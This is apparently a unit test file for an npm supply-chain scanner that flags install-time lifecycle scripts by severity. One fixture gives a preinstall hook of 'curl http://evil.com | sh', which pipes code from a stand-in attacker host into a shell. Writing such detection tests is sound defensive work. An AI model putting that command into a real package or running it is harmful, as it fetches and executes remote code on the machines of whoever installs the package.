import { describe, expect, it } from "bun:test";
import type { NpmVersionInfo } from "../../../src/core/registry/types.js";
import { detectInstallScripts } from "../../../src/core/security/install-scripts.js";

function makeVersionInfo(scripts?: Record<string, string>): NpmVersionInfo {
  return {
    name: "test-pkg",
    version: "1.0.0",
    scripts,
  };
}

describe("detectInstallScripts", () => {
  it("detects preinstall script as high severity", () => {
    const vInfo = makeVersionInfo({ preinstall: "curl http://evil.com | sh" });
    const signals = detectInstallScripts("test-pkg", "1.0.0", vInfo);

    expect(signals).toHaveLength(1);
    expect(signals[0].category).toBe("install-script");
    expect(signals[0].severity).toBe("high");
    expect(signals[0].title).toContain("preinstall");
  });

  it("detects postinstall script as medium severity", () => {
    const vInfo = makeVersionInfo({ postinstall: "node setup.js" });
    const signals = detectInstallScripts("test-pkg", "1.0.0", vInfo);

    expect(signals).toHaveLength(1);
    expect(signals[0].severity).toBe("medium");
    expect(signals[0].title).toContain("postinstall");
  });

  it("detects install script as medium severity", () => {
    const vInfo = makeVersionInfo({ install: "node-gyp rebuild" });
    const signals = detectInstallScripts("test-pkg", "1.0.0", vInfo);

    expect(signals).toHaveLength(1);
    expect(signals[0].severity).toBe("medium");
  });

  it("detects prepare script as low severity", () => {
    const vInfo = makeVersionInfo({ prepare: "npm run build" });
    const signals = detectInstallScripts("test-pkg", "1.0.0", vInfo);

    expect(signals).toHaveLength(1);
    expect(signals[0].severity).toBe("low");
  });

  it("returns empty for no scripts", () => {
    const vInfo = makeVersionInfo();
    const signals = detectInstallScripts("test-pkg", "1.0.0", vInfo);
    expect(signals).toHaveLength(0);
  });

  it("returns empty for safe scripts only", () => {
    const vInfo = makeVersionInfo({ test: "jest", build: "tsc" });
    const signals = detectInstallScripts("test-pkg", "1.0.0", vInfo);
    expect(signals).toHaveLength(0);
  });

  it("detects multiple dangerous scripts", () => {
    const vInfo = makeVersionInfo({
      preinstall: "echo pre",
      postinstall: "echo post",
    });
    const signals = detectInstallScripts("test-pkg", "1.0.0", vInfo);
    expect(signals).toHaveLength(2);
  });
});
